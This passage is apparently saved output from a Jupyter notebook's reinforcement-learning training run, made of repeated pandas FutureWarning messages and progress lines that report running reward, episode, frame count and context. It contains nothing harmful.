      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 7\t Frame count: 3700\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 3800\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 3900\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 4000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 7\t Frame count: 4100\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 4200\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 4300\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 4400\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 4500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 7\t Frame count: 4600\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 4700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 7\t Frame count: 4800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 7\t Frame count: 4900\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 5000\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 5100\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 5200\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 5300\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 5400\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 5500\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 5600\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 5700\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 5800\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 5900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 7\t Frame count: 6000\t Context: 1\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 6100\t Context: 2\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 6200\t Context: 2\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 6300\t Context: 2\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 6400\t Context: 2\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 6500\t Context: 2\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 6600\t Context: 2\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 6700\t Context: 2\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 6800\t Context: 2\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 6900\t Context: 2\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 7000\t Context: 2\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 7100\t Context: 2\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 7200\t Context: 2\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 7300\t Context: 2\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 7400\t Context: 2\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 7500\t Context: 2\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 7600\t Context: 2\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 7700\t Context: 2\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 7800\t Context: 2\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 7900\t Context: 2\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 8000\t Context: 2\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 8100\t Context: 2\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 8200\t Context: 2\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 8300\t Context: 2\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 8400\t Context: 2\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 8500\t Context: 2\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 8600\t Context: 2\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 8700\t Context: 2\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 8800\t Context: 2\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 8900\t Context: 2\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 9000\t Context: 2\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 9100\t Context: 2\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 9200\t Context: 2\n",
      "Running reward: 11.00\t Episode 7\t Frame count: 9300\t Context: 2\n",
      "Running reward: 11.00\t Episode 8\t Frame count: 9400\t Context: 1\n",
      "Running reward: 11.00\t Episode 8\t Frame count: 9500\t Context: 1\n",
      "Running reward: 11.00\t Episode 9\t Frame count: 9600\t Context: 1\n",
      "Running reward: 11.00\t Episode 9\t Frame count: 9700\t Context: 2\n",
      "Running reward: 11.00\t Episode 9\t Frame count: 9800\t Context: 2\n",
      "Running reward: 11.00\t Episode 9\t Frame count: 9900\t Context: 2\n",
      "Running reward: 11.00\t Episode 9\t Frame count: 10000\t Context: 2\n",
      "Running reward: 11.00\t Episode 9\t Frame count: 10100\t Context: 2\n",
      "Running reward: 11.00\t Episode 9\t Frame count: 10200\t Context: 2\n",
      "Running reward: 11.00\t Episode 9\t Frame count: 10300\t Context: 2\n",
      "Running reward: 11.00\t Episode 9\t Frame count: 10400\t Context: 2\n",
      "Running reward: 11.00\t Episode 10\t Frame count: 10500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 10\t Frame count: 10600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 10\t Frame count: 10700\t Context: 1\n",
      "Running reward: 11.00\t Episode 10\t Frame count: 10800\t Context: 1\n",
      "Running reward: 11.00\t Episode 10\t Frame count: 10900\t Context: 1\n",
      "Running reward: 11.00\t Episode 10\t Frame count: 11000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 10\t Frame count: 11100\t Context: 1\n",
      "Running reward: 11.00\t Episode 10\t Frame count: 11200\t Context: 1\n",
      "Running reward: 11.00\t Episode 10\t Frame count: 11300\t Context: 2\n",
      "Running reward: 11.00\t Episode 10\t Frame count: 11400\t Context: 2\n",
      "Running reward: 11.00\t Episode 10\t Frame count: 11500\t Context: 2\n",
      "Running reward: 11.00\t Episode 10\t Frame count: 11600\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 11\t Frame count: 11700\t Context: 1\n",
      "Running reward: 11.00\t Episode 11\t Frame count: 11800\t Context: 1\n",
      "Running reward: 11.00\t Episode 11\t Frame count: 11900\t Context: 1\n",
      "Running reward: 11.00\t Episode 11\t Frame count: 12000\t Context: 2\n",
